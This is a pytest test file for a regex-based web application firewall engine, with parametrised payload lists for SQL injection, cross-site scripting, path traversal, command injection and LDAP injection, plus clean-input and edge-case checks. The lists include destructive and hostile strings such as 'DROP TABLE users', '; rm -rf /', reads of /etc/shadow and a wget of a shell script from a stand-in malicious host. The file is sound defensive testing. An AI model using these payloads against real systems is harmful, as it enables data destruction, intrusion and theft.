"""
PyWAF Detection Engine Tests

Tests for the WAF regex-based threat detection engine across all attack categories.
30+ test cases covering SQL Injection, XSS, Path Traversal, Command Injection,
LDAP Injection, and clean payload verification.
"""
import pytest
import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from waf.engine import WAFEngine
from waf.rules import get_rules


@pytest.fixture
def engine():
    """Create a WAF engine with all rules at 'paranoid' sensitivity for thorough testing."""
    rules = get_rules(sensitivity='paranoid')
    return WAFEngine(rules=rules, sensitivity='paranoid')


class TestSQLInjection:
    """SQL Injection detection tests."""

    PAYLOADS = [
        "' OR 1=1 --",
        "1; DROP TABLE users",
        "1 UNION SELECT username, password FROM users",
        "'; DELETE FROM users; --",
        "' OR '1'='1",
        "admin' #",
        "1 AND 1=1",
        "1 exec sp_executesql",
        "1; SELECT * FROM information_schema.tables",
        "' WAITFOR DELAY '0:0:5'--",
        "1 UNION ALL SELECT NULL,NULL",
        "'; INSERT INTO users VALUES('hacker','pass'); --",
    ]

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_detects_sqli(self, engine, payload):
        result = engine.inspect(payload, source='test')
        assert result is not None, f"Failed to detect SQLi: {payload}"
        assert result.threat_type == 'SQL_INJECTION', f"Wrong type for: {payload}, got {result.threat_type}"


class TestXSS:
    """Cross-Site Scripting detection tests."""

    PAYLOADS = [
        "<script>alert(1)</script>",
        "javascript:void(0)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "eval('alert(1)')",
        "document.cookie",
        "<div onclick=alert(1)>click</div>",
    ]

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_detects_xss(self, engine, payload):
        result = engine.inspect(payload, source='test')
        assert result is not None, f"Failed to detect XSS: {payload}"
        assert result.threat_type == 'XSS_ATTACK', f"Wrong type for: {payload}, got {result.threat_type}"


class TestPathTraversal:
    """Path Traversal detection tests."""

    PAYLOADS = [
        "../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/var/www/../../etc/shadow",
        "..\\..\\..\\..\\..\\..\\etc\\passwd",
        "/../../../../../../etc/passwd",
    ]

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_detects_path_traversal(self, engine, payload):
        result = engine.inspect(payload, source='test')
        assert result is not None, f"Failed to detect Path Traversal: {payload}"
        assert result.threat_type == 'PATH_TRAVERSAL', f"Wrong type for: {payload}, got {result.threat_type}"


class TestCommandInjection:
    """Command Injection detection tests."""

    PAYLOADS = [
        "`ls -la`",
        "$(whoami)",
        "; rm -rf /",
        "| cat /tmp/data",
        "&& id",
        "|| whoami",
        "; wget http://malicious.com/shell.sh",
        "$(touch /tmp/pwned)",
    ]

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_detects_command_injection(self, engine, payload):
        result = engine.inspect(payload, source='test')
        assert result is not None, f"Failed to detect Command Injection: {payload}"
        assert result.threat_type == 'COMMAND_INJECTION', f"Wrong type for: {payload}, got {result.threat_type}"


class TestLDAPInjection:
    """LDAP Injection detection tests."""

    PAYLOADS = [
        ")(|(cn=*))",
        "*)(objectClass=*",
        ")(objectClass=user)",
        "(&(uid=admin)",
    ]

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_detects_ldap_injection(self, engine, payload):
        result = engine.inspect(payload, source='test')
        assert result is not None, f"Failed to detect LDAP Injection: {payload}"
        assert result.threat_type == 'LDAP_INJECTION', f"Wrong type for: {payload}, got {result.threat_type}"


class TestCleanPayloads:
    """Verify clean inputs pass through without false positives."""

    PAYLOADS = [
        "laptop",
        "hello world",
        "john@example.com",
        "search query 123",
        "12345",
        "This is a normal sentence.",
        "username",
        "New York City",
        "product-name-123",
        "2024-01-15",
    ]

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_clean_passes(self, engine, payload):
        result = engine.inspect(payload, source='test')
        assert result is None, f"False positive on clean input: {payload} → {result}"


class TestEdgeCases:
    """Edge case tests."""

    def test_empty_string(self, engine):
        assert engine.inspect("", source='test') is None

    def test_none_input(self, engine):
        assert engine.inspect(None, source='test') is None

    def test_very_long_clean_string(self, engine):
        assert engine.inspect("A" * 10000, source='test') is None

    def test_unicode_input(self, engine):
        assert engine.inspect("こんにちは世界", source='test') is None

    def test_numeric_input(self, engine):
        assert engine.inspect("42", source='test') is None

    def test_threat_info_fields(self, engine):
        result = engine.inspect("' OR 1=1 --", source='query_param')
        assert result is not None
        assert result.threat_type == 'SQL_INJECTION'
        assert result.source == 'query_param'
        assert result.payload is not None
        assert result.severity is not None
